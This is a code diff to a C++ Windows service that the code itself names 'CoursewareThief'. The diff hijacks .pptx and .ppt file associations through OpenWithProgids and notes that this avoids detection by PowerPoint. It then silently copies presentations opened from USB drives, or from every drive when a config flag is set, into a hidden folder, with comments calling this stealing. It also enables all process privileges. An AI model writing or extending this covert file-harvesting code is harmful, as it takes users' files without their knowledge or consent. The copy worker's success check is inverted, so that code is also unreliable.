@@ -4,6 +4,7 @@
 #include <unordered_set>
 #include <accctrl.h>
 #include <aclapi.h>
+#include <json/json.h>
 #include "resource.h"
 using namespace std;
 
@@ -13,6 +14,20 @@ extern HINSTANCE hInst;
 
 
 wstring szSvcName;
+
+static unordered_set<wstring> processingFiles;
+
+static std::map<wstring, std::any> service_config;
+template<typename Ty>
+static Ty GetServiceConfigAsType(wstring key, Ty defaultValue = (Ty())) {
+	try {
+		auto& value = service_config.at(key);
+		return std::any_cast<Ty>(value);
+	}
+	catch (...) {
+		return defaultValue;
+	}
+}
 
 
 
@@ -80,6 +95,9 @@ static DWORD WINAPI FileAssocChanger(PVOID) {
 		return GetLastError();
 	wstring cmd = L"\"" + GetProgramPathW() + L"PPTX.exe\" \"%1\"";
 
+#if 0
+	// 老方法：直接修改打开方式
+	// 缺点：会被POWERPNT检测
 	RegOpenKeyExW(HKEY_CLASSES_ROOT, L".pptx", 0, KEY_READ | KEY_WRITE, &hk);
 	if (!hk) return -1;
 	MyQueryRegistryValue(hk, L"", L"CoursewareThiefOriginalValue", originalOpenType);
@@ -89,7 +107,19 @@ static DWORD WINAPI FileAssocChanger(PVOID) {
 		MySetRegistryValue(hk, L"", L"", L"CoursewareThief.PPTX");
 	}
 	RegCloseKey(hk);
+#else
+	// 新方法：修改OpenWithProgids
+	{
+		RegCreateKeyExW(HKEY_CLASSES_ROOT, L".pptx"
+			"\\OpenWithProgids", 0, NULL, 0,
+			KEY_READ | KEY_WRITE, NULL, &hk, NULL);
+		if (hk) RegCloseKey(hk);
+		bool result = MySetRegistryValue(HKEY_CLASSES_ROOT, L".pptx"
+			"\\OpenWithProgids", L"CoursewareThief.PPTX", cmd);
+	}
+#endif
 
+#if 0
 	RegOpenKeyExW(HKEY_CLASSES_ROOT, L".ppt", 0, KEY_READ | KEY_WRITE, &hk);
 	if (!hk) return -1;
 	MyQueryRegistryValue(hk, L"", L"CoursewareThiefOriginalValue", originalOpenType);
@@ -99,11 +129,20 @@ static DWORD WINAPI FileAssocChanger(PVOID) {
 		MySetRegistryValue(hk, L"", L"", L"CoursewareThief.PPTX");
 	}
 	RegCloseKey(hk);
+#else
+	// 同理
 
-	RegOpenKeyExW(HKEY_CLASSES_ROOT, L"CoursewareThief.PPTX\\"
-		L"shell\\open\\command", 0,
-		KEY_READ | KEY_WRITE, &hk);
-	if (!hk) {
+	{
+		RegCreateKeyExW(HKEY_CLASSES_ROOT, L".ppt"
+			"\\OpenWithProgids", 0, NULL, 0,
+			KEY_READ | KEY_WRITE, NULL, &hk, NULL);
+		if (hk) RegCloseKey(hk);
+		bool result = MySetRegistryValue(HKEY_CLASSES_ROOT, L".ppt"
+			"\\OpenWithProgids", L"CoursewareThief.PPTX", cmd);
+	}
+#endif
+
+	{
 		RegCreateKeyExW(HKEY_CLASSES_ROOT, L"CoursewareThief.PPTX\\"
 			L"shell\\open\\command", 0, NULL, 0,
 			KEY_READ | KEY_WRITE, NULL, &hk, NULL);
@@ -113,7 +152,6 @@ static DWORD WINAPI FileAssocChanger(PVOID) {
 		//fstream fp("app.log", ios::app);
 		//fp << "result: " << result << endl;
 	}
-	RegCloseKey(hk);
 
 
 	return 0;
@@ -132,6 +170,10 @@ bool ShellOpenCourseware(wstring file, DWORD session) {
 }
 
 
+#include "cwdef.h"
+
+
+
 
 static bool IsRemovableDrive(const std::wstring& disk) {
 	UINT driveType = GetDriveTypeW(disk.c_str());
@@ -143,25 +185,51 @@ static bool IsRemovableDrive(const std::wstring& disk) {
 
 	return false;
 }
+int __stdcall ServiceFileCopyWorker(CmdLineW& cl) {
+	/*
+	cmdline example:
+
+	DWORD retCode = Process.StartAndWait(L"cwtcopy --type=service-worker"
+		" --function=file-copy --is-not-javascript-service-worker "
+		"--source=\"" + cw + L"\" --destination=\"" + targetFile +
+		L"\" --write-pipe=\"" + pipeName + L"\" --exit-signal=//TODO");
+	*/
+	wstring src, dest;
+	cl.getopt(L"source", src); cl.getopt(L"destination", dest);
+
+	if (src.empty() || dest.empty()) return ERROR_INVALID_PARAMETER;
+
+	BOOL result = CopyFileW(src.c_str(), dest.c_str(), FALSE);
+	if (result) return GetLastError();
+
+	return 0;
+}
 static bool OpenCoursewareFromNamedPipe(HANDLE hPipe, wstring cw) {
 	if (cw.empty()) return false;
 
 	auto direct = [&] {
+		processingFiles.erase(cw);
 		DWORD sessionID = WTSGetActiveConsoleSessionId();
 		GetNamedPipeClientSessionId(hPipe, &sessionID);
 		return ShellOpenCourseware(cw, sessionID);
 	};
 
+	if (processingFiles.contains(cw)) return true; // 直接返回
+	processingFiles.insert(cw);
+
 	// 判断文件是否在U盘上
 	wstring disk = cw[0] + L":\\";
-	if (!IsRemovableDrive(disk)) {
+	if (GetServiceConfigAsType<bool>(L"cw.steal.fromEverywhere") == false
+		&& !IsRemovableDrive(disk)
+	) {
 		// 直接打开
 		return direct();
 	}
 
 	// 文件在U盘上
 	auto size = MyGetFileSizeW(cw);
-	if (size > ULONGLONG(100) * 1024 * 1024) { // 100MB
+	if (size > GetServiceConfigAsType<ULONGLONG>(L"cw.steal.maxSize",
+		ULONGLONG(1024) * 1024 * 1024)) { // 1GB
 		// 直接打开
 		return direct();
 	}
@@ -177,26 +245,87 @@ static bool OpenCoursewareFromNamedPipe(HANDLE hPipe, wstring cw) {
 
 	nModTime.LowPart = modifyTime.dwLowDateTime;
 	nModTime.HighPart = modifyTime.dwHighDateTime;
-	wstring targetFolderName = L"@@" + cw + L"." + to_wstring(nModTime.QuadPart) +
-		L"-917a77f7";
-	wstring targetFile = L"Files\\" + targetFolderName + L"\\" + cw;
+	if (cw.length() < cw.find(L"\\")) return direct();
+	wstring file_name = cw.substr(cw.find_last_of(L"\\") + 1);
+	wstring cwid = GenerateUUIDW();
+	wstring targetFolderName = cwid;
+	CwIndexData_LoadFileData();
+	vector<CwIndex_MetaData> meta;
+	if (CwIndexData_GetFileData(cw, meta)) {
+		auto cwsize = MyGetFileSizeW(cw);
+		for (auto& i : meta) {
+			if (i.file_modify_time == nModTime.QuadPart && i.fileSize == cwsize) {
+				// 偷过了
+				wstring targetFile = GetProgramPathW() + L"Files\\" +
+					i.fileId + L"\\" + file_name;
+				DWORD sessionID = WTSGetActiveConsoleSessionId();
+				GetNamedPipeClientSessionId(hPipe, &sessionID);
+				processingFiles.erase(cw);
+				return ShellOpenCourseware(targetFile, sessionID);
+			}
+		}
+	}
+
+	wstring targetFile = L"Files\\" + targetFolderName + L"\\" + file_name;
 	targetFile = GetProgramPathW() + targetFile;
-	if (file_exists(L"Files/" + targetFolderName) &&
+
+#if 0
+	if (0 && file_exists(L"Files/" + targetFolderName) &&
 		file_exists(targetFile)) {
 		// 偷过了
 		DWORD sessionID = WTSGetActiveConsoleSessionId();
 		GetNamedPipeClientSessionId(hPipe, &sessionID);
 		return ShellOpenCourseware(targetFile, sessionID);
 	}
+#endif
 
 	// 偷了
 	// TODO: 显示偷取进度
 
 	CreateDirectoryW((L"Files/" + targetFolderName).c_str(), NULL);
-	CopyFileW(cw.c_str(), targetFile.c_str(), FALSE);
-	
+	wstring pipeName = L"\\\\.\\pipe\\" + cwid;
+	wstring cmdLine = L"cwtcopy --type=service-worker"
+		" --function=file-copy --is-not-javascript-service-worker "
+		"--source=\"" + cw + L"\" --destination=\"" + targetFile +
+		L"\" --write-pipe=\"" + pipeName + L"\" --exit-signal=//TODO";
+	DWORD retCode = [&] {
+		STARTUPINFO si{}; PROCESS_INFORMATION pi{};
+		si.cb = sizeof(si);
+		PWSTR lpCommandLine = new wchar_t[cmdLine.length() + 1];
+		wcscpy_s(lpCommandLine, cmdLine.length() + 1, cmdLine.c_str());
+		if (!CreateProcessW(NULL, lpCommandLine, NULL, NULL, TRUE,
+			CREATE_SUSPENDED | HIGH_PRIORITY_CLASS, NULL, NULL, &si, &pi)) {
+			return GetLastError();
+		}
+		DWORD dwRet = 0;
+		ResumeThread(pi.hThread);
+		CloseHandle(pi.hThread);
+		WaitForSingleObject(pi.hProcess, INFINITE);
+		GetExitCodeProcess(pi.hProcess, &dwRet);
+		CloseHandle(pi.hProcess);
+		return dwRet;
+	}();
+	//CopyFileW(cw.c_str(), targetFile.c_str(), FALSE);
+	if (retCode != 0) {
+		// 偷取失败了...
+		fstream fp(L"error.log", ios::app);
+		fp << "[" << time(0) << "]" << "Failed to steal file: " << ws2s(cw) <<
+			" |to| " << ws2s(targetFile) << " , code=" << retCode << endl;
+		fp.close();
+
+		return direct();
+	}
+
+	FILETIME currentTime{};
+	GetSystemTimeAsFileTime(&currentTime);
+	ULARGE_INTEGER currentTimeInt{};
+	currentTimeInt.LowPart = currentTime.dwLowDateTime;
+	currentTimeInt.HighPart = currentTime.dwHighDateTime;
+	CwIndexData_InsertItem(cw, cwid, currentTimeInt.QuadPart, nModTime.QuadPart);
+
 	if (file_exists(L"Files/" + targetFolderName) &&
 		file_exists(targetFile)) {
+		processingFiles.erase(cw);
 		// 打开
 		DWORD sessionID = WTSGetActiveConsoleSessionId();
 		GetNamedPipeClientSessionId(hPipe, &sessionID);
@@ -270,8 +399,8 @@ static DWORD WINAPI GlobalOpenerPipe(PVOID) {
 	while (true) { // Loop to accept multiple connections  
 		hPipe = CreateNamedPipeW(
 			pipeName,
-			PIPE_ACCESS_DUPLEX | FILE_FLAG_FIRST_PIPE_INSTANCE,
-			PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
+			PIPE_ACCESS_DUPLEX,
+			PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
 			64,
 			1024, 1024, 0, &sa
 		);
@@ -300,6 +429,93 @@ static DWORD WINAPI GlobalOpenerPipe(PVOID) {
 }
 
 
+static void LoadServiceConfig() {
+	if ((!file_exists("config.json")) ||
+		MyGetFileSizeW(L"config.json") > 16 * 1024 * 1024 // config too large
+		) {
+		fstream fp("config.json", ios::out);
+		fp << "{}";
+		fp.close();
+	}
+	HANDLE hFile = CreateFileW(L"config.json", GENERIC_READ, FILE_SHARE_READ,
+		NULL, OPEN_ALWAYS, NULL, NULL);
+	string allTexts; // UTF8 string
+	if (hFile != INVALID_HANDLE_VALUE && hFile) {
+		char buffer[4096]{}; DWORD r = 0;
+		while (ReadFile(hFile, buffer, 4096, &r, 0)) {
+			if (!r) break;
+			allTexts += buffer;
+			if (allTexts.size() > 16 * 1024 * 1024) break; // string too long
+		}
+		CloseHandle(hFile);
+	}
+
+	try {
+		// 解析JSON字符串  
+		Json::Reader reader;
+		Json::Value root;
+		if (!reader.parse(allTexts, root)) {
+			// 解析失败，输出错误信息  
+			//std::cerr << "Failed to parse JSON: " <<
+			//	reader.getFormattedErrorMessages() << std::endl;
+			//return false;
+		}
+
+		// 遍历JSON对象并填充service_config  
+		if (root.isObject()) {
+			for (Json::Value::iterator it = root.begin(); it != root.end(); ++it) {
+				std::string key = it.key().asString();
+				std::any value;
+				if (it->type() == Json::stringValue) {
+					// string
+					string str = it->asString();
+					value = ConvertUTF8ToUTF16(str);
+				}
+				else if (it->type() == Json::booleanValue) {
+					// bool
+					value = it->asBool();
+				}
+				else if (it->type() == Json::intValue) {
+					// int
+					value = it->asInt64();
+				}
+				else if (it->type() == Json::uintValue) {
+					// uint
+					value = it->asUInt64();
+				}
+				else if (it->type() == Json::realValue) {
+					// double
+					value = it->asDouble();
+				}
+				else if (it->type() == Json::nullValue) {
+					// nullptr
+					value = nullptr;
+				}
+				else continue;
+
+				// 将键和值转换回宽字符串  
+				std::wstring wideKey = ConvertUTF8ToUTF16(key);
+
+				// 存储到全局变量中  
+				service_config[wideKey] = value;
+			}
+		}
+		else {
+			// 根节点不是对象，JSON格式错误  
+			//std::cerr << "Root is not a JSON object." << std::endl;
+			//return false;
+		}
+
+	}
+	catch (std::exception) {
+		// 捕获并输出异常信息  
+		//std::cerr << "Exception parsing JSON: " << e.what() << std::endl;
+		//return false;
+	}
+
+}
+
+
 constexpr LPTHREAD_START_ROUTINE workerThreads[] = {
 	UserSessionIdWatcher,
 	GlobalOpenerPipe,
@@ -312,14 +528,19 @@ HANDLE hServiceWorkerThreads[min(32, workerThreadsCount)] = {};
 	if (file_exists(x)) DeleteFileW(x); \
 	CopyFileW(GetProgramDirW().c_str(), x, FALSE);
 DWORD WINAPI srv_main(PVOID) {
+	EnableAllPrivileges();
+
 	checkFile(L"cwtui.exe");
 	checkFile(L"cwtshell.exe");
+	checkFile(L"cwtcopy.exe");
 
 	if (IsFileOrDirectory(L"Files") != -1) {
 		if (IsFileOrDirectory(L"Files") == 1) RemoveDirectoryW(L"Files");
 		CreateDirectoryW(L"Files", NULL);
 		SetFileAttributesW(L"Files", FILE_ATTRIBUTE_HIDDEN);
 	}
+
+	LoadServiceConfig();
 
 	AutoZeroMemory(hServiceWorkerThreads);
 
